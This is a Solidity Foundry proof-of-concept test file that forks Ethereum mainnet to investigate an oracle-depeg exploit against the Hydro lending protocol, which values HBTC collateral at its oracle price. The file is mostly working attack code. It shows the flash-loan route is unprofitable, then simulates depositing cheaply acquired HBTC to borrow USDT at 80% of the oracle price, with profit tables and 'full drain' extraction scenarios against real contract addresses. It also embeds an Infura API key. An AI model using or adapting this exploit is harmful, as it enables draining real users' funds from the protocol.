// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "forge-std/Test.sol";

/**
 * @title HydroFlashSwapPoC
 * @notice Complete flash loan/swap investigation for Hydro HBTC Oracle Depeg
 *
 * FINDING: Zero-capital flash loan attack is NOT feasible because:
 * - Curve StableSwap prices HBTC ≈ WBTC (1:1) on-chain
 * - Hydro oracle also prices HBTC ≈ WBTC
 * - 80% LTV means flash-borrow-return cycle always loses ~20%
 * - No other on-chain DEX has meaningful HBTC liquidity
 *
 * The depeg is CEX vs Oracle, NOT DEX vs Oracle.
 * Profitable attack REQUIRES acquiring HBTC off-chain at market discount.
 */

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
    function totalSupply() external view returns (uint256);
}

interface ICurvePool {
    function get_dy(int128 i, int128 j, uint256 dx) external view returns (uint256);
    function exchange(int128 i, int128 j, uint256 dx, uint256 min_dy) external returns (uint256);
}

interface IBalancerVault {
    function flashLoan(address, address[] calldata, uint256[] calldata, bytes calldata) external;
}

interface IChainlink {
    function latestRoundData() external view returns (uint80, int256, uint256, uint256, uint80);
    function decimals() external view returns (uint8);
}

interface IUniRouter {
    function getAmountsIn(uint, address[] calldata) external view returns (uint[] memory);
    function swapExactTokensForTokens(uint, uint, address[] calldata, address, uint) external returns (uint[] memory);
}

contract HydroFlashSwapPoC is Test {
    address constant HYDRO = 0x241e82C79452F51fbfc89Fac6d912e021dB1a3B7;
    address constant HBTC = 0x0316EB71485b0Ab14103307bf65a021042c6d380;
    address constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address constant WBTC = 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599;
    address constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address constant CURVE = 0x4CA9b3063Ec5866A4B82E437059D2C43d1be596F;
    address constant BALANCER = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;
    address constant BTC_FEED = 0xF4030086522a5bEEa4988F8cA5B36dbC97BeE88c;
    address constant UNI_ROUTER = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;

    uint16 constant MKT = 5;

    struct Action { uint8 actionType; bytes encodedParams; }
    bytes4 constant BATCH = bytes4(keccak256("batch((uint8,bytes)[])"));

    bool _inFlash;

    function setUp() public {
        vm.createSelectFork("https://mainnet.infura.io/v3/bfc7283659224dd6b5124ebbc2b14e2c");
    }

    // ====== Helper: get BTC price in USD (whole dollars) ======
    function _btcUsd() internal view returns (uint256) {
        (, int256 p,,,) = IChainlink(BTC_FEED).latestRoundData();
        uint8 d = IChainlink(BTC_FEED).decimals();
        return uint256(p) / (10 ** d);
    }

    // ====== Helper: get raw BTC price and decimals ======
    function _btcRaw() internal view returns (uint256 price, uint8 dec) {
        (, int256 p,,,) = IChainlink(BTC_FEED).latestRoundData();
        return (uint256(p), IChainlink(BTC_FEED).decimals());
    }

    // ====== Helper: build Hydro batch ======
    function _hydroBatch(uint256 hAmt, address bAsset, uint256 bAmt, address u)
        internal pure returns (Action[] memory)
    {
        Action[] memory a = new Action[](5);
        a[0] = Action(0, abi.encode(HBTC, hAmt));
        a[1] = Action(2, abi.encode(HBTC, uint8(0), uint16(0), u, uint8(1), MKT, u, hAmt));
        a[2] = Action(3, abi.encode(MKT, bAsset, bAmt));
        a[3] = Action(2, abi.encode(bAsset, uint8(1), MKT, u, uint8(0), uint16(0), u, bAmt));
        a[4] = Action(1, abi.encode(bAsset, bAmt));
        return a;
    }

    // ====== Helper: execute Hydro batch ======
    function _execBatch(Action[] memory actions) internal returns (bool) {
        (bool ok,) = HYDRO.call(abi.encodeWithSelector(BATCH, actions));
        return ok;
    }

    // ============================================================
    // TEST 1: Prove flash WBTC → Curve → Hydro is UNPROFITABLE
    // ============================================================
    function test_01_flash_route_unprofitable() public view {
        console.log("=== FLASH LOAN ROUTE ANALYSIS ===");
        console.log("Block:", block.number);

        uint256 btc = _btcUsd();
        console.log("BTC/USD:", btc);

        // Curve rate: 1 WBTC → ? HBTC
        uint256 hOut = ICurvePool(CURVE).get_dy(1, 0, 1e8);
        console.log("Curve: 1 WBTC ->", hOut, "HBTC (raw)");

        // Hydro borrow at 80% LTV
        uint256 borrowUsd = btc * 80 / 100;
        console.log("Borrow per HBTC:", borrowUsd, "USD");
        console.log("Cost to repay 1 WBTC:", btc, "USD");

        if (borrowUsd > btc) {
            console.log("PROFITABLE! Gain:", borrowUsd - btc);
        } else {
            console.log("UNPROFITABLE. Loss:", btc - borrowUsd);
        }

        console.log("");
        console.log("ROOT CAUSE:");
        console.log("Curve StableSwap: HBTC ~= WBTC (1:1)");
        console.log("Hydro Oracle: HBTC ~= WBTC (Chainlink proxy)");
        console.log("80% LTV -> guaranteed 20% loss on flash route");
        console.log("Depeg is CEX vs Oracle, not DEX vs Oracle");
    }

    // ============================================================
    // TEST 2: Live Balancer flash loan attempt
    // ============================================================
    function test_02_balancer_flash_attempt() public {
        console.log("=== LIVE BALANCER FLASH TEST ===");
        console.log("Balancer WBTC:", IERC20(WBTC).balanceOf(BALANCER));

        address[] memory t = new address[](1);
        t[0] = WBTC;
        uint256[] memory a = new uint256[](1);
        a[0] = 1e8; // 1 WBTC

        uint256 before = IERC20(USDT).balanceOf(address(this));
        _inFlash = true;

        try IBalancerVault(BALANCER).flashLoan(address(this), t, a, "") {
            uint256 gained = IERC20(USDT).balanceOf(address(this)) - before;
            console.log("Flash succeeded! USDT gained:", gained / 1e6);
        } catch {
            console.log("Flash REVERTED (expected: route unprofitable)");
            console.log("Cannot repay WBTC with only 80% LTV borrow");
        }
        _inFlash = false;
    }

    // Balancer callback
    function receiveFlashLoan(
        address[] calldata, uint256[] calldata amounts, uint256[] calldata fees, bytes calldata
    ) external {
        require(msg.sender == BALANCER && _inFlash);
        console.log("  [CB] WBTC received:", amounts[0]);
        console.log("  [CB] Fee:", fees[0]);

        // Step 1: WBTC → HBTC on Curve
        IERC20(WBTC).approve(CURVE, amounts[0]);
        uint256 hGot = ICurvePool(CURVE).exchange(1, 0, amounts[0], 0);
        console.log("  [CB] HBTC from Curve:", hGot);

        // Step 2: HBTC → Hydro borrow USDT
        IERC20(HBTC).approve(HYDRO, hGot);
        uint256 btc = _btcUsd();
        uint256 maxBorrow = hGot * btc * 80 / 100 / 1e12; // in USDT (6 dec)
        uint256 hydroBal = IERC20(USDT).balanceOf(HYDRO);
        if (maxBorrow > hydroBal) maxBorrow = hydroBal;
        maxBorrow = maxBorrow * 99 / 100;

        console.log("  [CB] Attempting borrow:", maxBorrow / 1e6, "USDT");

        Action[] memory acts = _hydroBatch(hGot, USDT, maxBorrow, address(this));
        bool ok = _execBatch(acts);
        console.log("  [CB] Hydro borrow:", ok ? "OK" : "FAIL");

        // Step 3: Buy WBTC back with USDT
        uint256 wbtcNeeded = amounts[0] + fees[0];
        uint256 usdtHave = IERC20(USDT).balanceOf(address(this));
        console.log("  [CB] USDT have:", usdtHave / 1e6);
        console.log("  [CB] WBTC need:", wbtcNeeded);

        if (usdtHave > 0 && ok) {
            IERC20(USDT).approve(UNI_ROUTER, usdtHave);
            address[] memory path = new address[](3);
            path[0] = USDT; path[1] = WETH; path[2] = WBTC;

            try IUniRouter(UNI_ROUTER).getAmountsIn(wbtcNeeded, path) returns (uint[] memory needed) {
                console.log("  [CB] USDT needed for 1 WBTC:", needed[0] / 1e6);
                if (needed[0] <= usdtHave) {
                    IUniRouter(UNI_ROUTER).swapExactTokensForTokens(
                        needed[0], wbtcNeeded, path, address(this), block.timestamp
                    );
                    console.log("  [CB] WBTC bought back!");
                } else {
                    console.log("  [CB] DEFICIT:", (needed[0] - usdtHave) / 1e6, "USDT");
                }
            } catch {
                console.log("  [CB] Uniswap quote failed");
            }
        }

        // Repay Balancer
        uint256 wbtcBal = IERC20(WBTC).balanceOf(address(this));
        if (wbtcBal >= wbtcNeeded) {
            IERC20(WBTC).transfer(BALANCER, wbtcNeeded);
        } else if (wbtcBal > 0) {
            IERC20(WBTC).transfer(BALANCER, wbtcBal);
        }
    }

    // ============================================================
    // TEST 3: Optimal external HBTC attack (CEX-funded)
    // ============================================================
    function test_03_optimal_external_attack() public {
        console.log("=== OPTIMAL ATTACK (External HBTC) ===");
        uint256 btc = _btcUsd();
        console.log("BTC/USD:", btc);

        uint256 hydroU = IERC20(USDT).balanceOf(HYDRO);
        console.log("Hydro USDT:", hydroU / 1e6);

        // Use 2 HBTC from Curve pool
        uint256 hAmt = IERC20(HBTC).balanceOf(CURVE);
        console.log("Curve HBTC:", hAmt);

        address atk = address(0xBEEF);
        vm.prank(CURVE);
        IERC20(HBTC).transfer(atk, hAmt);

        // Calculate borrow: hAmt * btcUsd * 0.80 (in USDT 6 dec)
        uint256 borrow = hAmt * btc * 80 / 100 / 1e12;
        if (borrow > hydroU) borrow = hydroU;
        borrow = borrow * 99 / 100;

        console.log("Borrow amount:", borrow / 1e6, "USDT");

        vm.startPrank(atk);
        IERC20(HBTC).approve(HYDRO, hAmt);
        Action[] memory acts = _hydroBatch(hAmt, USDT, borrow, atk);
        bool ok = _execBatch(acts);
        vm.stopPrank();

        if (ok) {
            uint256 gained = IERC20(USDT).balanceOf(atk);
            console.log("USDT extracted:", gained / 1e6);
            uint256 cost45 = btc * hAmt * 45 / 100 / 1e18;
            console.log("HBTC cost at 45% depeg:", cost45, "USD");
            if (gained / 1e6 > cost45) {
                console.log("PROFIT:", gained / 1e6 - cost45, "USD");
            }
        } else {
            console.log("FAILED");
        }
    }

    // ============================================================
    // TEST 4: Maximum extraction scenarios
    // ============================================================
    function test_04_max_extraction() public view {
        console.log("=== MAXIMUM EXTRACTION SCENARIOS ===");
        uint256 btc = _btcUsd();
        uint256 hydroU = IERC20(USDT).balanceOf(HYDRO) / 1e6;
        uint256 borrowPerH = btc * 80 / 100;

        console.log("BTC/USD:", btc);
        console.log("Hydro USDT:", hydroU);
        console.log("Borrow/HBTC:", borrowPerH, "USD");

        // HBTC needed for full drain
        uint256 hForDrain = hydroU / borrowPerH;
        console.log("HBTC for full drain:", hForDrain);

        // Scenario table
        _scenario("2 HBTC (Curve)", 2, btc, borrowPerH, hydroU);
        _scenario("5 HBTC (CEX)", 5, btc, borrowPerH, hydroU);
        _scenario("10 HBTC (CEX)", 10, btc, borrowPerH, hydroU);
        _scenario("12 HBTC (full drain)", hForDrain + 1, btc, borrowPerH, hydroU);

        // Depeg sensitivity
        console.log("");
        console.log("=== DEPEG SENSITIVITY (per HBTC) ===");
        console.log("Borrow/HBTC:", borrowPerH, "USD");
        _depegLine(20, btc, borrowPerH);
        _depegLine(30, btc, borrowPerH);
        _depegLine(40, btc, borrowPerH);
        _depegLine(50, btc, borrowPerH);
        _depegLine(60, btc, borrowPerH);
        _depegLine(70, btc, borrowPerH);

        console.log("");
        console.log("Break-even: > 20% depeg from oracle");
    }

    function _scenario(string memory name, uint256 hbtcCount, uint256 btc, uint256 borrowPer, uint256 hydroMax) internal pure {
        console.log("");
        console.log(name);
        uint256 totalBorrow = hbtcCount * borrowPer;
        if (totalBorrow > hydroMax) totalBorrow = hydroMax;
        uint256 cost45 = hbtcCount * btc * 45 / 100;
        console.log("  Borrow:", totalBorrow, "USDT");
        console.log("  Cost@45%:", cost45, "USD");
        if (totalBorrow > cost45) {
            console.log("  PROFIT:", totalBorrow - cost45, "USD");
        }
    }

    function _depegLine(uint256 pct, uint256 btc, uint256 borrowPer) internal pure {
        uint256 cost = btc * (100 - pct) / 100;
        if (borrowPer > cost) {
            console.log("  depeg", pct, "% -> profit/HBTC:", borrowPer - cost);
        } else {
            console.log("  depeg", pct, "% -> loss/HBTC:", cost - borrowPer);
        }
    }

    // ============================================================
    // TEST 5: Max borrow ceiling per HBTC
    // ============================================================
    function test_05_max_borrow_ceiling() public {
        console.log("=== MAX BORROW CEILING PER HBTC ===");

        uint256 hAmt = 1 ether;
        vm.prank(CURVE);
        IERC20(HBTC).transfer(address(this), hAmt);
        IERC20(HBTC).approve(HYDRO, type(uint256).max);

        // Binary search for max borrow
        uint256 lo = 40000 * 1e6;
        uint256 hi = 100000 * 1e6;

        while (hi - lo > 100 * 1e6) {
            uint256 mid = (lo + hi) / 2;
            uint256 snap = vm.snapshot();

            Action[] memory acts = _hydroBatch(hAmt, USDT, mid, address(this));
            bool ok = _execBatch(acts);
            if (ok) {
                lo = mid;
            } else {
                hi = mid;
            }
            vm.revertTo(snap);
        }

        console.log("Max borrow per 1 HBTC:", lo / 1e6, "USDT");
        console.log("BTC/USD oracle:", _btcUsd());
        console.log("LTV:", lo * 100 / (_btcUsd() * 1e6), "%");
    }

    // ============================================================
    // TEST 6: Cross-market analysis
    // ============================================================
    function test_06_cross_market() public {
        console.log("=== CROSS-MARKET HBTC COLLATERAL ===");

        uint256 hAmt = 0.1 ether;
        vm.prank(CURVE);
        IERC20(HBTC).transfer(address(this), hAmt);
        IERC20(HBTC).approve(HYDRO, type(uint256).max);

        for (uint16 m = 0; m <= 10; m++) {
            uint256 snap = vm.snapshot();
            Action[] memory a = new Action[](5);
            a[0] = Action(0, abi.encode(HBTC, hAmt));
            a[1] = Action(2, abi.encode(HBTC, uint8(0), uint16(0), address(this), uint8(1), m, address(this), hAmt));
            a[2] = Action(3, abi.encode(m, USDT, 100 * 1e6));
            a[3] = Action(2, abi.encode(USDT, uint8(1), m, address(this), uint8(0), uint16(0), address(this), 100 * 1e6));
            a[4] = Action(1, abi.encode(USDT, 100 * 1e6));

            (bool ok,) = HYDRO.call(abi.encodeWithSelector(BATCH, a));
            if (ok) console.log("Market", m, ": HBTC collateral ACCEPTED");
            vm.revertTo(snap);
        }
    }

    // ============================================================
    // TEST 7: Multi-asset borrow from market 5
    // ============================================================
    function test_07_multi_asset_borrow() public {
        console.log("=== MULTI-ASSET BORROW FROM MKT 5 ===");

        uint256 hAmt = 1 ether;
        vm.prank(CURVE);
        IERC20(HBTC).transfer(address(this), hAmt);
        IERC20(HBTC).approve(HYDRO, type(uint256).max);

        _tryAsset(hAmt, USDT, 1000 * 1e6, "USDT");
        _tryAsset(hAmt, 0x6B175474E89094C44Da98b954EedeAC495271d0F, 1000 ether, "DAI");
        _tryAsset(hAmt, 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48, 1000 * 1e6, "USDC");
    }

    function _tryAsset(uint256 hAmt, address asset, uint256 amt, string memory name) internal {
        uint256 snap = vm.snapshot();
        Action[] memory acts = _hydroBatch(hAmt, asset, amt, address(this));
        bool ok = _execBatch(acts);
        console.log(name, ":", ok ? "YES" : "NO");
        vm.revertTo(snap);
    }

    // ============================================================
    // TEST 8: Full economics summary
    // ============================================================
    function test_08_economics_summary() public view {
        console.log("=== COMPLETE ECONOMICS ===");
        uint256 btc = _btcUsd();
        uint256 hydroU = IERC20(USDT).balanceOf(HYDRO);

        console.log("BTC/USD:", btc);
        console.log("Hydro USDT:", hydroU / 1e6);
        console.log("HBTC supply:", IERC20(HBTC).totalSupply() / 1e18);
        console.log("Curve HBTC:", IERC20(HBTC).balanceOf(CURVE));

        console.log("");
        console.log("=== FLASH LOAN: IMPOSSIBLE ===");
        console.log("Curve HBTC/WBTC: 1:1 (StableSwap)");
        console.log("Oracle HBTC/WBTC: 1:1 (Chainlink proxy)");
        console.log("LTV: 80%");
        console.log("Flash borrow 1 WBTC -> swap 1 HBTC -> borrow 80% -> repay 100%");
        console.log("Net: -20% per WBTC borrowed = LOSS");

        console.log("");
        console.log("=== CEX ATTACK: PROFITABLE ===");
        console.log("Buy HBTC at market (est 45% of oracle)");
        console.log("Deposit in Hydro, borrow at 80% of oracle");
        console.log("Profit = 80% - 45% = 35% of BTC/USD per HBTC");
        uint256 profitPerH = btc * 35 / 100;
        console.log("Profit per HBTC:", profitPerH, "USD");
        console.log("Max Hydro USDT drain:", hydroU / 1e6, "USDT");
    }
}
